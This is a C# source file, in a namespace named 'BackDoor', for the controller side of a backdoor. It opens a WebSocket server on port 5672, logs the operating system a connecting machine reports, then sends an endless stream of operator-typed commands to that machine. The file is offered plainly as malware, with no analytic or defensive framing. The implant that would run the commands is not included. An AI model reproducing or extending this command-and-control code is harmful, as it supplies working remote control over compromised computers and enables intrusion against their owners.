using WebSocketSharp.Server;
using WebSocketSharp;

namespace BackDoor
{
    public class Program : WebSocketBehavior
    {
        public static void Main(string[] args)
        {
            short port = 5672;
            string server = "ws://localhost";

            var ws = new WebSocketServer(server + ":" + port);

            ws.AddWebSocketService<Program>("/");
            ws.Start();
            
            Console.WriteLine("Started on Port: " + port);
            Console.ReadKey();
            
        }
        protected override void OnMessage(MessageEventArgs e)
        {
            string userOs = e.Data;
            if (userOs != "")
            {
                Console.WriteLine($"New connection, OS: {userOs}");
                while (true)
                {
                    Console.Write("Enter command: ");
                    Send(Console.ReadLine());
                }
            }
        }
        protected override void OnError(WebSocketSharp.ErrorEventArgs e)
        {
            Console.WriteLine("Error: " + e.Message);
        }
    }
}